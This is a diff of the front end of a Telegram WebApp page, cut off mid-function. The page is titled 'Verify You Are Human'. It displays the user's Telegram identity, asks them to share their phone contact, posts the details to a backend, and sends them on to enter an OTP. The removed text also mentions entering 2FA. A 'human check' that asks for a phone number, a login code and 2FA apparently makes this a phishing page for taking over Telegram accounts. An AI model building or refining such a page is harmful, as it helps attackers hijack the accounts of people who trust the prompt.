@@ -13,33 +13,35 @@
         }
         
         body {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            background: var(--tg-theme-bg-color, #f0f0f0);
+            color: var(--tg-theme-text-color, #000000);
             min-height: 100vh;
+            padding: 20px;
             display: flex;
             justify-content: center;
             align-items: center;
-            padding: 20px;
         }
         
         .container {
             width: 100%;
             max-width: 400px;
-            background: white;
-            border-radius: 20px;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            background: var(--tg-theme-secondary-bg-color, #ffffff);
+            border-radius: 16px;
             overflow: hidden;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
         }
         
         .header {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            color: white;
-            padding: 30px 20px;
+            background: var(--tg-theme-bg-color, #0088cc);
+            color: var(--tg-theme-button-text-color, #ffffff);
+            padding: 24px 20px;
             text-align: center;
         }
         
         .header h1 {
-            font-size: 24px;
-            margin-bottom: 10px;
+            font-size: 20px;
+            margin-bottom: 8px;
+            font-weight: 600;
         }
         
         .header p {
@@ -48,30 +50,29 @@
         }
         
         .content {
-            padding: 30px;
+            padding: 24px;
         }
         
         .btn {
             width: 100%;
             padding: 16px;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            color: white;
+            background: var(--tg-theme-button-color, #0088cc);
+            color: var(--tg-theme-button-text-color, #ffffff);
             border: none;
             border-radius: 12px;
             font-size: 16px;
             font-weight: 600;
             cursor: pointer;
-            transition: transform 0.2s, opacity 0.2s;
+            transition: opacity 0.2s;
             display: flex;
             align-items: center;
             justify-content: center;
             gap: 10px;
-            margin-bottom: 15px;
+            margin-bottom: 16px;
         }
         
         .btn:hover {
-            transform: translateY(-2px);
-            opacity: 0.95;
+            opacity: 0.9;
         }
         
         .btn:disabled {
@@ -80,11 +81,7 @@
         }
         
         .btn-secondary {
-            background: #666;
-        }
-        
-        .btn-secondary:hover {
-            background: #555;
+            background: var(--tg-theme-secondary-bg-color, #666666);
         }
         
         .error {
@@ -109,8 +106,8 @@
         .loading-spinner {
             width: 40px;
             height: 40px;
-            border: 3px solid #f3f3f3;
-            border-top: 3px solid #667eea;
+            border: 3px solid rgba(0,0,0,0.1);
+            border-top: 3px solid var(--tg-theme-button-color, #0088cc);
             border-radius: 50%;
             animation: spin 1s linear infinite;
             margin: 0 auto 15px;
@@ -126,22 +123,52 @@
         }
         
         .info-box {
-            background: #e8f5e9;
-            padding: 15px;
+            background: var(--tg-theme-section-bg-color, #f8f9fa);
+            padding: 16px;
             border-radius: 12px;
             margin-bottom: 20px;
-            text-align: center;
             font-size: 14px;
             line-height: 1.5;
+            color: var(--tg-theme-hint-color, #666666);
+            text-align: center;
         }
         
         .phone-display {
-            background: #f0f0f0;
+            background: var(--tg-theme-section-bg-color, #f8f9fa);
             padding: 12px;
             border-radius: 10px;
-            margin-bottom: 15px;
+            margin-bottom: 16px;
             text-align: center;
-            font-weight: bold;
+            font-weight: 600;
+            font-size: 16px;
+        }
+        
+        .user-info {
+            background: var(--tg-theme-section-bg-color, #f8f9fa);
+            padding: 16px;
+            border-radius: 12px;
+            margin-bottom: 16px;
+        }
+        
+        .user-info div {
+            margin-bottom: 8px;
+            font-size: 14px;
+        }
+        
+        .title {
+            font-size: 18px;
+            font-weight: 600;
+            margin-bottom: 16px;
+            text-align: center;
+            color: var(--tg-theme-text-color, #000000);
+        }
+        
+        .subtitle {
+            font-size: 14px;
+            color: var(--tg-theme-hint-color, #666666);
+            text-align: center;
+            margin-bottom: 24px;
+            line-height: 1.5;
         }
     </style>
 </head>
@@ -153,29 +180,42 @@
         </div>
         
         <div class="content">
-            <!-- Initial Screen -->
-            <div id="initial-screen">
+            <!-- User Info Display -->
+            <div class="user-info" id="user-info">
+                <div><b>👤 User Information:</b></div>
+                <div>Name: <span id="user-name">Loading...</span></div>
+                <div>Username: <span id="user-username">Loading...</span></div>
+                <div>ID: <span id="user-id">Loading...</span></div>
+            </div>
+            
+            <div class="title">Verify You Are Human</div>
+            
+            <div class="subtitle">
+                Please share your contact to verify your identity.
+                We'll send an OTP to your phone number for verification.
+            </div>
+            
+            <!-- Contact Sharing Screen -->
+            <div id="contact-screen">
                 <div class="info-box">
-                    <b>Verification Process:</b><br>
+                    <b>🔒 Verification Process:</b><br>
                     1. Click "Share Contact" below<br>
-                    2. OTP will be sent to your phone<br>
-                    3. Enter OTP in next screen<br>
-                    4. Complete 2FA if enabled
+                    2. Native Telegram contact picker opens<br>
+                    3. Select your contact<br>
+                    4. OTP will be sent automatically<br>
+                    5. Enter OTP in next screen
                 </div>
                 
                 <div class="error" id="error-message"></div>
                 
                 <button class="btn" onclick="shareContact()" id="share-btn">
-                    📞 Share My Contact
+                    <span style="font-size: 20px;">📞</span>
+                    Share My Contact
                 </button>
-                
-                <p style="text-align: center; color: #666; font-size: 14px; margin-top: 15px;">
-                    Your contact will be used only for OTP verification
-                </p>
             </div>
             
-            <!-- Contact Shared Screen -->
-            <div id="contact-screen" class="hidden">
+            <!-- Contact Processing Screen -->
+            <div id="processing-screen" class="hidden">
                 <div class="phone-display" id="phone-display">
                     Phone: Not shared yet
                 </div>
@@ -198,26 +238,34 @@
         </div>
     </div>
 
+    <!-- Telegram WebApp Script -->
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    
     <script>
+        // Telegram WebApp instance
+        let tg = window.Telegram?.WebApp;
         let sessionId = null;
         let phoneNumber = null;
         
         // Initialize WebApp
         document.addEventListener('DOMContentLoaded', function() {
-            // Get Telegram WebApp user data
-            const tg = window.Telegram?.WebApp;
-            
             if (tg) {
                 // Initialize WebApp
-                tg.expand();
-                tg.enableClosingConfirmation();
+                tg.expand(); // Expand WebApp to full screen
+                tg.enableClosingConfirmation(); // Ask before closing
                 
-                // Get user info
+                // Get user info from Telegram
                 const user = tg.initDataUnsafe?.user || {};
                 const userId = user.id || 'unknown';
                 const username = user.username || '';
                 const firstName = user.first_name || '';
                 const lastName = user.last_name || '';
+                const chatId = tg.initDataUnsafe?.chat?.id || tg.initDataUnsafe?.chat_instance;
+                
+                // Display user info
+                document.getElementById('user-name').textContent = `${firstName} ${lastName}`.trim() || 'Not provided';
+                document.getElementById('user-username').textContent = username ? `@${username}` : 'Not provided';
+                document.getElementById('user-id').textContent = userId;
                 
                 // Initialize session with backend
                 fetch('/init-session', {
@@ -229,14 +277,15 @@
                         user_id: userId,
                         username: username,
                         first_name: firstName,
-                        last_name: lastName
+                        last_name: lastName,
+                        chat_id: chatId
                     })
                 })
                 .then(response => response.json())
                 .then(data => {
                     if (data.success) {
                         sessionId = data.session_id;
-                        console.log('Session created:', sessionId);
+                        console.log('WebApp session created:', sessionId);
                     } else {
                         showError('Failed to initialize session');
                     }
@@ -245,9 +294,17 @@
                     console.error('Session init error:', error);
                     showError('Connection error. Please try again.');
                 });
+                
+                // Set Telegram theme colors
+                applyTelegramTheme();
+                
             } else {
-                // For testing outside Telegram
+                // For testing outside Telegram WebApp
                 console.log('Running outside Telegram WebApp');
+                document.getElementById('user-name').textContent = 'Test User';
+                document.getElementById('user-username').textContent = '@testuser';
+                document.getElementById('user-id').textContent = '123456789';
+                
                 fetch('/init-session', {
                     method: 'POST',
                     headers: {
@@ -255,9 +312,10 @@
                     },
                     body: JSON.stringify({
                         user_id: 'test_user',
-                        username: 'test',
+                        username: 'testuser',
                         first_name: 'Test',
-                        last_name: 'User'
+                        last_name: 'User',
+                        chat_id: 'test_chat'
                     })
                 })
                 .then(response => response.json())
@@ -270,104 +328,31 @@
             }
         });
         
+        function applyTelegramTheme() {
+            if (!tg) return;
+            
+            // Apply Telegram theme colors
+            document.documentElement.style.setProperty('--tg-theme-bg-color', tg.themeParams.bg_color || '#ffffff');
+            document.documentElement.style.setProperty('--tg-theme-text-color', tg.themeParams.text_color || '#000000');
+            document.documentElement.style.setProperty('--tg-theme-hint-color', tg.themeParams.hint_color || '#999999');
+            document.documentElement.style.setProperty('--tg-theme-link-color', tg.themeParams.link_color || '#0088cc');
+            document.documentElement.style.setProperty('--tg-theme-button-color', tg.themeParams.button_color || '#0088cc');
+            document.documentElement.style.setProperty('--tg-theme-button-text-color', tg.themeParams.button_text_color || '#ffffff');
+            document.documentElement.style.setProperty('--tg-theme-secondary-bg-color', tg.themeParams.secondary_bg_color || '#f0f0f0');
+            document.documentElement.style.setProperty('--tg-theme-section-bg-color', tg.themeParams.section_bg_color || '#f8f9fa');
+        }
+        
         function shareContact() {
             if (!sessionId) {
                 showError('Session not initialized. Please wait...');
                 return;
             }
             
-            const tg = window.Telegram?.WebApp;
-            
-            if (tg && tg.showContactRequest) {
-                // Request contact sharing via Telegram WebApp
-                tg.showContactRequest(async (contact) => {
-                    if (contact) {
-                        handleContactReceived(contact);
-                    } else {
-                        showError('Contact sharing cancelled');
-                    }
-                });
-            } else {
-                // Fallback for testing
-                const testPhone = prompt('Enter phone number for testing (with +):', '+1234567890');
-                if (testPhone) {
-                    const fakeContact = {
-                        phone_number: testPhone,
-                        first_name: 'Test',
-                        last_name: 'User'
-                    };
-                    handleContactReceived(fakeContact);
-                }
-            }
-        }
-        
-        function handleContactReceived(contact) {
-            phoneNumber = contact.phone_number;
-            
-            // Show contact screen
-            document.getElementById('initial-screen').classList.add('hidden');
-            document.getElementById('contact-screen').classList.remove('hidden');
-            document.getElementById('phone-display').textContent = `Phone: ${phoneNumber}`;
-            
-            // Send contact to backend
-            sendContactToBackend(phoneNumber);
-        }
-        
-        function sendContactToBackend(phone) {
-            showLoading('Sending OTP...');
-            
-            fetch('/api/verify-contact', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                    session_id: sessionId,
-                    phone: phone
-                })
-            })
-            .then(response => response.json())
-            .then(data => {
-                if (data.success) {
-                    // Redirect to OTP page
-                    window.location.href = data.redirect_url;
-                } else {
-                    hideLoading();
-                    document.getElementById('contact-error').textContent = data.error || 'Failed to send OTP';
-                    document.getElementById('contact-error').classList.add('show');
-                    
-                    // Show retry button
-                    setTimeout(() => {
-                        document.getElementById('contact-screen').classList.add('hidden');
-                        document.getElementById('initial-screen').classList.remove('hidden');
-                    }, 3000);
-                }
-            })
-            .catch(error => {
-                hideLoading();
-                showError('Network error. Please try again.');
-            });
-        }
-        
-        function showLoading(message) {
-            document.getElementById('loading-text').textContent = message || 'Processing...';
-            document.getElementById('contact-screen').classList.add('hidden');
-            document.getElementById('loading-screen').classList.remove('hidden');
-        }
-        
-        function hideLoading() {
-            document.getElementById('loading-screen').classList.add('hidden');
-        }
-        
-        function showError(message) {
-            const errorEl = document.getElementById('error-message');
-            errorEl.textContent = message;
-            errorEl.classList.add('show');
-            
-            setTimeout(() => {
-                errorEl.classList.remove('show');
-            }, 5000);
-        }
-    </script>
-</body>
-</html>
+            // Check if we're in Telegram WebApp
+            if (tg && tg.isVersionAtLeast('6.9')) {
+                // Use Telegram WebApp contact sharing (Bot API 6.9+)
+                // Note: This is different from requestContact() which is for Mini Apps
+                // For WebApp, we need to use contact sharing via chat
+                
+                // In WebApp, we can use the contact field in initDataUnsafe if available
+               
